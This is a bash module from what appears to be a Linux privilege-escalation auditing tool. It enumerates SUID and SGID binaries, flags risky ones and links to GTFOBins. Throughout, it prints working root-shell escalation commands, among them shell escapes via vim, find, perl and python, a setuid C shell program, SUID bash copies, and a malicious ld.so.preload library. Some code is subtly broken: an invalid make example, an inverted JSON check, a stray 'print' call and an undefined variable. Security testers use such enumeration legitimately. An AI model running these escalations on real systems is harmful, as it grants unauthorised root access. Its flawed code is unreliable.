#!/bin/bash

source "$(dirname "${BASH_SOURCE[0]}")/../utils/helpers.sh"

GTFOBINS_BASE_URL="https://gtfobins.github.io"

SUID_DANGEROUS="nmap vim vi find bash sh zsh dash perl python python3 ruby lua awk gawk mawk gcc g++ cc make ld so ld.so ldconfig env git hg svn bzip2 gzip zip tar dd nc ncat netcat socat curl wget aria2c Links elinks fetch ftp tftp snmpwalk snmpget strace ltrace trace ldd strings"

SUID_SENSITIVE="/etc/passwd /etc/shadow /etc/gshadow /etc/sudoers /etc/sudoers.d /etc/hosts /etc/crontab /etc/anacrontab /etc/fstab /etc/motd"

check_suid_binaries() {
    print_title "SUID BINARIES ANALYSIS"
    
    print_info "Searching for SUID binaries..."
    
    local suid_files=$(find / -perm -4000 -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null)
    
    if [[ -z "$suid_files" ]]; then
        print_warn "No SUID binaries found"
        return
    fi
    
    local dangerous_count=0
    local total_count=0
    
    print_subtitle "Found SUID binaries:"
    
    while IFS= read -r suid_file; do
        [[ -z "$suid_file" ]] && continue
        total_count=$((total_count + 1))
        
        local filename=$(basename "$suid_file")
        local perms=$(get_file_perms "$suid_file")
        
        local is_dangerous=false
        
        for dangerous in $SUID_DANGEROUS; do
            if [[ "$filename" == "$dangerous" ]]; then
                is_dangerous=true
                dangerous_count=$((dangerous_count + 1))
                break
            fi
        done
        
        if [[ "$is_dangerous" == "true" ]]; then
            print_high "$perms $suid_file"
            
            print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/${filename}"
            
            [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "suid" "high" "Dangerous SUID binary: $filename" "$suid_file" "GTFOBins: ${GTFOBINS_BASE_URL}/gtfobins/${filename}"
        else
            print_info "$perms $suid_file"
        fi
        
    done <<< "$suid_files"
    
    print_info "Total SUID binaries: $total_count"
    print_info "Potentially dangerous: $dangerous_count"
    
    if [[ "$dangerous_count" -gt 0 ]]; then
        print_subtitle "Exploitation examples:"
        print_command "# Vim SUID"
        print_command "vim -c ':!sh'"
        print_command ""
        print_command "# Find SUID"
        print_command "find . -exec /bin/sh \; -quit"
        print_command ""
        print_command "# Perl SUID"
        print_command "perl -e 'exec \"/bin/sh\"'"
        print_command ""
        print_command "# Python SUID"
        print_command "python -c 'import os; os.execv(\"/bin/sh\",[\"sh\"])'"
    fi
    
    echo ""
}

check_sgid_binaries() {
    print_title "SGID BINARIES ANALYSIS"
    
    print_info "Searching for SGID binaries..."
    
    local sgid_files=$(find / -perm -2000 -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null)
    
    if [[ -z "$sgid_files" ]]; then
        print_warn "No SGID binaries found"
        return
    fi
    
    local count=0
    
    print_subtitle "Found SGID binaries:"
    
    while IFS= read -r sgid_file; do
        [[ -z "$sgid_file" ]] && continue
        count=$((count + 1))
        
        local perms=$(get_file_perms "$sgid_file")
        print_info "$perms $sgid_file"
        
    done <<< "$sgid_files"
    
    print_info "Total SGID binaries: $count"
    
    echo ""
}

check_suid_exploitable() {
    print_title "SUID EXPLOITABLE BINARY DETAILS"
    
    local dangerous_tools=("nmap" "vim" "vi" "find" "bash" "sh" "perl" "python" "python3" "ruby" "gcc" "make")
    
    for tool in "${dangerous_tools[@]}"; do
        local tool_path=$(command -v "$tool" 2>/dev/null)
        
        if [[ -n "$tool_path" ]] && is_suid "$tool_path"; then
            print_high "SUID $tool found at $tool_path"
            
            print_subtitle "Privilege escalation methods:"
            
            case "$tool" in
                nmap)
                    print_command "nmap --interactive"
                    print_command "nmap> !sh"
                    print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/nmap"
                    ;;
                vim|vi)
                    print_command "vim -c ':!sh'"
                    print_command "vim -c ':set shell=/bin/sh :shell'"
                    print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/vim"
                    ;;
                find)
                    print_command "find / -exec /bin/sh \; -quit"
                    print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/find"
                    ;;
                bash)
                    print_command "bash -p"
                    print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/bash"
                    ;;
                sh)
                    print_command "sh -p"
                    print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/sh"
                    ;;
                perl)
                    print_command "perl -e 'exec \"/bin/sh\"'"
                    print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/perl"
                    ;;
                python*)
                    print_command "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                    print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/python3"
                    ;;
                ruby)
                    print_command "ruby -e 'exec \"/bin/sh\", \"-p\"'"
                    print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/ruby"
                    ;;
                gcc)
                    print_command 'cat > /tmp/priv.c << EOF'
                    print_command '#include <unistd.h>'
                    print_command 'int main() { setuid(0); execv("/bin/sh", (char*[]){"sh", NULL}); }'
                    print_command 'EOF'
                    print_command "gcc /tmp/priv.c -o /tmp/priv && /tmp/priv"
                    ;;
                make)
                    print_command "COMMAND=/bin/sh sh"
                    print_command "find / -name make -exec /bin/sh \;"
                    print_link "GTFOBins" "${GTFOBINS_BASE_URL}/gtfobins/make"
                    ;;
            esac
            
            print ""
        fi
    done
    
    print_subtitle "General SUID exploitation:"
    print_command "# Check if you own the SUID binary"
    print_command "ls -la /usr/bin/sudo"
    print_command ""
    print_command "# If you own it, you can replace it"
    print_command "cp /bin/bash /tmp/suidbash"
    print_command "chmod +s /tmp/suidbash"
    print_command "/tmp/suidbash -p"
    
    echo ""
}

check_writable_suid() {
    print_title "WRITABLE SUID BINARIES"
    
    print_info "Checking for writable SUID binaries..."
    
    local writable_suid=$(find / -perm -4000 -type f -writable ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null)
    
    if [[ -n "$writable_suid" ]]; then
        print_critical "WRITABLE SUID BINARIES FOUND!"
        
        while IFS= read -r ws_file; do
            print_critical "$ws_file"
            [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "suid" "critical" "Writable SUID binary" "$ws_file" "Replace with malicious binary"
        done <<< "$writable_suid"
        
        print_subtitle "Exploitation:"
        print_command "# Replace writable SUID binary"
        print_command "cp /bin/bash /tmp/suidbash"
        print_command "chmod +s /tmp/suidbash"
        print_command "/tmp/suidbash -p"
    else
        print_good "No writable SUID binaries found"
    fi
    
    echo ""
}

check_library_hijacking() {
    print_title "LIBRARY HIJACKING POSSIBILITIES"
    
    print_info "Checking for SUID binaries with writable dependencies..."
    
    local ldd_output=""
    
    if [[ -n "$LDD_CMD" ]]; then
        while IFS= read -r suid_file; do
            [[ -z "$suid_file" ]] && continue
            
            local deps=$($LDD_CMD "$suid_file" 2>/dev/null)
            
            if [[ -n "$deps" ]]; then
                local writable_deps=$(echo "$deps" | grep -E "=> /" | awk '{print $3}' | while read -r dep; do
                    if [[ -w "$dep" ]]; then
                        echo "$dep"
                    fi
                done)
                
                if [[ -n "$writable_deps" ]]; then
                    print_high "$suid_file has writable dependencies:"
                    echo "$writable_deps" | while read -r wd; do
                        print_info "  $wd"
                    done
                fi
            fi
        done <<< "$(find / -perm -4000 -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -10)"
    else
        print_warn "ldd not available for library analysis"
    fi
    
    print_subtitle "ld.so.preload exploitation:"
    print_command "# If you can write to /etc/ld.so.preload"
    print_command "echo '/tmp/malicious.so' > /etc/ld.so.preload"
    print_command "# Create malicious shared library"
    print_command 'cat > /tmp/malicious.c << EOF'
    print_command '#include <unistd.h>'
    print_command 'void _init() {'
    print_command '    unlink("/etc/ld.so.preload");'
    print_command '    setuid(0);'
    print_command '    execv("/bin/sh", (char*[]){"sh", NULL});'
    print_command '}'
    print_command 'EOF'
    print_command "gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c"
    print_command "sudo $any_suid_binary"
    
    echo ""
}

check_strings_in_suid() {
    print_title "STRINGS ANALYSIS IN SUID BINARIES"
    
    if [[ -z "$STRINGS_CMD" ]]; then
        print_warn "strings command not available"
        print_info "Install binutils: apt-get install binutils"
    else
        print_info "Checking for hardcoded paths in SUID binaries..."
        
        while IFS= read -r suid_file; do
            [[ -z "$suid_file" ]] && continue
            
            local strings_output=$($STRINGS_CMD "$suid_file" 2>/dev/null | grep -E "^/" | head -5)
            
            if [[ -n "$strings_output" ]]; then
                print_info "$suid_file references paths:"
                echo "$strings_output" | while read -r path; do
                    if [[ -w "$path" ]]; then
                        print_high "  Writable: $path"
                    else
                        print_info "  $path"
                    fi
                done
            fi
        done <<< "$(find / -perm -4000 -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -5)"
    fi
    
    echo ""
}

run_suid_checks() {
    check_suid_binaries
    check_sgid_binaries
    check_suid_exploitable
    check_writable_suid
    check_library_hijacking
    check_strings_in_suid
}
